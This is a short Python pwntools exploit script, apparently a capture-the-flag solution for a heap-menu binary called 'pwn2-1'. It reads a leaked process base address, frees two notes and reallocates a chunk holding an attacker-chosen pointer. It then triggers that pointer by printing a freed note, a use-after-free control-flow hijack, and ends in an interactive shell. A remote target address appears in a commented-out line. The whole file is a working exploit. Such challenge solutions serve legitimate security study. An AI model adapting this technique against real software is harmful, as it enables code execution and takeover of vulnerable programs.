from pwn import *

context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe nt bash -c".split()

sh = process(['./pwn2-1'])
elf = ELF('./pwn2-1')
# sh = remote("172.51.65.145", 9999)

def add_note(size: int, content: bytes):
    sh.sendlineafter(b"Your choice :", b"1")
    sh.sendlineafter(b"Note size :", str(size).encode())
    sh.sendafter(b"Content :", content)

def del_note(idx: int):
    sh.sendlineafter(b"Your choice :", b"2")
    sh.sendlineafter(b"Index :", str(idx).encode())

def print_note(idx: int):
    sh.sendlineafter(b"Your choice :", b"3")
    sh.sendlineafter(b"Index :", str(idx).encode())


sh.sendlineafter(b"Your choice :", b"5")
sh.recvuntil(b"tips\n")
proc_base = int(sh.recvline(keepends=False), 16) - 0x11F0
print(hex(proc_base))
add_note(0x20, b'AAAAAAAA')  # 0
add_note(0x20, b'BBBBBBBB')  # 1
del_note(0)
del_note(1)
add_note(0x10, p64(proc_base + 0x1B70))  # 2
print_note(0)
sh.interactive()